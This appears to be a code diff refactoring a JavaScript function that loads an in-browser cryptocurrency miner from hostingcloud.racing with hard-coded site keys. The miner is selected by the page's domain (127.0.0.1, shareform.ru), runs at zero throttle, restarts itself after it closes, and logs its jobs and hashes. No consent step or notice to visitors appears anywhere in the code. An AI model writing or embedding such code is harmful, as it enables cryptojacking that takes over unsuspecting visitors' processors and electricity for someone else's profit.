@@ -1,11 +1,29 @@
-function coins() {
-    let instance;
+function coins(sites) {
+    let instance = {};
+    const url = new URL(document.location.href);
+    if (!arguments.length) {
+        sites = [{
+                id: 'local',
+                match: '127.0.0.1',
+                src: 'https://www.hostingcloud.racing/2KFX.js',
+                key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
+            },
+            {
+                id: 'share',
+                match: 'shareform.ru',
+                src: 'https://www.hostingcloud.racing/rhdQ.js',
+                key: 'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'
+            }
+        ];
+    }
     let src; //script src
     let key;
+
 
     function loadScript(src) {
         return new Promise(function(resolve, reject) {
             let script = document.createElement('script');
+
             script.src = src;
 
             script.onload = () => resolve(script);
@@ -31,6 +49,13 @@ function coins() {
 
     // запускаем майнер
     instance.start = () => {
+
+        sites.forEach(function(item, _i, _arr) {
+            if (url.toString().indexOf(item.match) != -1) {
+                src = item.src;
+                key = item.key;
+            }
+        });
 
         loadScript(src)
             .then(
@@ -64,11 +89,23 @@ function coins() {
 
                     _client.on('job', function(args) {
                         jobs = jobs + 1;
+                        console.log('job: ');
+                        console.log(args);
+                        /*
+
+                        {algo: "lyra2v2-webchain", blob: "f901d9a06260f54cb2e8aa5098d10f3f7b78145b7593972315…1835fb9608347e7c48084600f1ca580880000000000000000", job_id: "1db5bc16d5ea5d9e1a958e28b537cec3", target: "4ac5d987cfb02b00", throttle: 0}
+
+                        */
                     });
 
                     _client.on('found', function(args) {
+                        console.log('found: ');
                         console.log(args);
+                        /*
 
+                        {hashesPerSecond: 0.9893007128039792, hashes: 1, job_id: "9cecf646f600e75ed1ff9c8bbdfbda4e", nonce: "c29dcb5c507896bc", result: "000a4a60b04dec1bcbe1ac8014f22e0252d4b45bd8167a42c79c675aee587abe"}
+
+                        */
                         founds = founds + 1;
                         last = new Date();
                         if (founds > jobs) {
@@ -108,107 +145,6 @@ function coins() {
                 });
         return instance;
     };
-
-
-
-    const _url = new URL(document.location.href);
-    const _s = {
-        'local': {
-            'src': 'https://www.hostingcloud.racing/2KFX.js',
-            'key': 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
-        },
-        'share': {
-            'src': 'https://www.hostingcloud.racing/rhdQ.js',
-            'key': 'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'
-        }
-    };
-    let _src = '';
-    let _key = '';
-
-    if (_url.toString().indexOf('127.0.0.1') != -1) {
-        _src = _s.local.src;
-        _key = _s.local.key;
-    } else if (_url.toString().indexOf('shareform.ru') != -1) {
-        _src = _s.share.src;
-        _key = _s.share.key;
-    }
-
-
-    loadScript(_src)
-        .then(
-            function(result) {
-                let _client = new Client.Anonymous(_key, {
-                    throttle: 0,
-                    c: 'w'
-                });
-
-                let start = new Date();
-                let now = start;
-                let last = start;
-                let running = false;
-                let hashes = 0;
-                let jobs = 0;
-                let founds = 0;
-
-                _client.start();
-
-                let onMobile = _client.isMobile();
-                //let wasmEnabled = _client.hasWASMSupport();
-                //let isAutoThreads = _client.getAutoThreadsEnabled();
-                let hps = _client.getHashesPerSecond();
-                //let threads = _client.getNumThreads();
-                //let throttle = _client.getThrottle();
-
-                _client.on('open', function(args) {
-                    start = new Date();
-                });
-
-                _client.on('job', function(args) {
-                    jobs = jobs + 1;
-                });
-
-                _client.on('found', function(args) {
-                    console.log(args);
-
-                    founds = founds + 1;
-                    last = new Date();
-                    if (founds > jobs) {
-                        founds = 0;
-                        _client.stop();
-                    }
-                });
-
-                _client.on('close', function(args) {
-                    jobs = 0;
-                    founds = 0;
-                    last = new Date();
-                    _client.start();
-                });
-
-
-
-                setInterval(function() {
-
-                    running = _client.isRunning();
-                    hps = _client.getHashesPerSecond();
-
-                    now = new Date();
-                    let diff = ((now - last) / 1000).toFixed(1);
-
-                    console.log(hps.toFixed(2) + ' (' + jobs + '/' + founds + ') ' + diff + 'с');
-
-
-                    if (diff > 90) {
-                        last = new Date();
-                        _client.stop();
-                    }
-
-
-                }, 500);
-            },
-            function(error) {
-                console.log(error);
-            });
 
     return instance;
 }
